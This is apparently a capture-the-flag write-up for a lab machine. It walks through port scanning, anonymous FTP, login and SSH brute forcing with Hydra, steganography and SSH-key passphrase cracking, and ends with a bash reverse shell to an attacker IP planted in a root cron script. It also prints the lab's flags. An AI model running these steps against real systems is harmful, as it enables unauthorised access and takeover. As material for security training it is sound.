# Attacker's Walkthrough: Exploiting the Vulnerable Machine

## Step 1: Initial Reconnaissance


1. Port Scanning

Once we have the target’s IP address, we run an Nmap scan to identify open ports and the services
running on those ports. The goal is to understand what services might be vulnerable.
```bash
sudo nmap <ip> --min-rate 1000 -A
```
Output:
```bash
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed
22/tcp open ssh OpenSSH 6.6.1p1
8088/tcp open http Apache httpd 2.4.7
|_http-title: the Grappler
```
FTP (Port 21): Anonymous login is allowed, potentially giving us access to files without credentials.
SSH (Port 22): SSH is available for remote login.
HTTP (Port 8088): Apache web server is running on port 8088.

## FTP Service Exploration
With FTP allowing anonymous login, we connect to the FTP server and explore the files available.
```bash
ftp <ip> 21
```
Once logged in, list the available files:
```bash
ls
```

Output:
```bash
fasttrack.txt
audio.wav
```
We download both files for further analysis:
```bash
get fasttrack.txt
get audio.wav
exit
```

## Apache Server Enumeration

Next, we enumerate the Apache server running on port 8088 using dirsearch, which helps us identify any
hidden directories or files.
```bash
dirsearch -u http://<ip>:8088/
```
Output:
```bash
302 - /dashboard.php
200 - /login.php
403 - /server-status
```
The login.php page is of interest, as it may allow us to attempt login and find a way in.

## Morse Code Audio Analysis

Upon closer examination, the audio.wav file contains Morse code signals instead of standard speech or
music. Use an online Morse code decoder or a tool like morse in Linux to extract the hidden message.


## Brute Force the Login Page

Next, we explore the login.php page for any login opportunities. We already have a password list in
fasttrack.txt, which we use to brute-force the login page using Burp Suite. During the attack, we observe
that one of the responses has a different length, indicating a valid login attempt.

Credentials:
```bash
Username: ****
Password: *i*t*r20**
```

## Post-Login Actions
------------------------
Once logged in, we are redirected to dashboard.php. We see a suspicious encoded string. This could be
a flag or a clue, so we decode it using a base64 decoder. It turns out to be part of a rabbit hole—there’s
more to investigate.

A "Download" button appears on the dashboard, offering image.jpg. We download it for further analysis.

## Steganography (Image Analysis)
----------------------------------
We suspect that image.jpg might also contain hidden data. Using steghide, a tool for extracting hidden
data in images, we try to extract the data from the image.

```bash
steghide extract -sf image.jpg
```

It asks for a passphrase. We don’t know the passphrase yet, but we can crack it by using the wordlist we
obtained earlier (fasttrack.txt).

```bash
stegcracker image.jpg fasttrack.txt
```

Output:
```bash
Passphrase: P**s**r*1*
```
Using the correct passphrase, we extract the hidden content into output.txt.

## Decode Hidden Message

Open the output.txt file to reveal a message:

```bash
cat output.txt
ffu hfreanzr : onxv
oehgr vg !!!!
```
This text is ROT13 encoded, so we use the tr command to decode it.

```bash
echo "ffu hfreanzr : onxv" | tr ’A-Za-z’ ’N-ZA-Mn-za-m’
echo "oehgr vg !!!!" | tr ’A-Za-z’ ’N-ZA-Mn-za-m’
```
The decoded message provides us with the SSH username and password.

## Brute Force SSH Login

With the decoded SSH credentials, we attempt to log in using Hydra to brute-force the password,
providing our wordlist (fasttrack.txt).

```bash
hydra -l ****** -P fasttrack.txt ssh://<ip> -t 4 -v
```

Credentials:
```bash
Username: ******
Password: s**m**20**
```

## SSH Login and User Flag

Now that we have SSH access, we log in:

```bash
ssh <username>@<ip> -p 22
```
We check the directory for the user1.txt flag, which contains:

```bash
cat user1.txt
RTHA{find_the_flag}
```

## Privilege Escalation (SSH Key)

While logged in as user1, we investigate further and find an SSH private key (id_rsa) for another user,
user2. The key is passphrase-protected. To access it, we use John the Ripper to crack the passphrase.

```bash
ssh2john id_rsa > id_rsa.john
john id_rsa.john
```
After cracking the passphrase, we log in as user2 using the SSH key:

```bash
chmod 400 id_rsa
ssh -i id_rsa user2@<ip>
```

We then check the directory for the user1.txt flag.

cat user2.txt
RTHA{509HB6IWEHM6KS9K1}

## Cron Job Privilege Escalation

While investigating the system, we find a suspicious cron job running every minute as root. The cron job
executes a script (run.sh) that zips files from a sensitive directory.

We edit run.sh to include a reverse shell command, gaining root access:

```bash
nano /home/bakihanma/cron/run.sh
#!/bin/bash
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

chmod 777 /home/bakihanma/cron/run.sh
```

On our attack machine, we listen for the reverse shell:

```bash
nc -lvp 4455
````
Once the cron job runs, we get a reverse shell as root.

## Root Flag

Now that we have root access, we can read the root.txt flag:

```bash
cat /root/root.txt
RTHA{INEESQ2LIVHF6RCJJZHEKUQ}
````
